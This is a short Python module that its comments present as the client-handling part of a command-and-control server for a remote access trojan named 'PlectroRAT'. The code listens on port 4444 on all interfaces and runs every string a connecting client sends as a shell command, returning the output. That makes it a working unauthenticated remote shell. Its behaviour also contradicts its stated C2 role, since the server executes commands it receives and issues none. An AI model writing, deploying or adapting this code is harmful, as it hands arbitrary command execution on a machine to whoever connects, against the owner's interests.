

# Handler functions for PlectroRAT C2 server
# This module manages client registration, command dispatch, and logging

import socket
import threading

clients = {}  # Maps client_id to socket
logs = {}     # Maps client_id to list of log messages

def handle_client(client_socket, client_address):
    client_id = f"{client_address[0]}:{client_address[1]}"
    clients[client_id] = client_socket
    logs[client_id] = []

    try:
        while True:
            command = client_socket.recv(4096)
            if not command:
                break
            command_str = command.decode("utf-8").strip()
            logs[client_id].append(f"> {command_str}")
            try:
                output = execute_command(command_str)
            except Exception as e:
                output = f"[!] Error: {e}"
            client_socket.send(output.encode("utf-8"))
            logs[client_id].append(output)
    except Exception as e:
        logs[client_id].append(f"[!] Disconnected: {e}")
    finally:
        client_socket.close()
        del clients[client_id]

def execute_command(cmd):
    import subprocess
    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    return result.decode("utf-8")

def start_server(host="0.0.0.0", port=4444):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] New connection from {addr}")
        thread = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
        thread.start()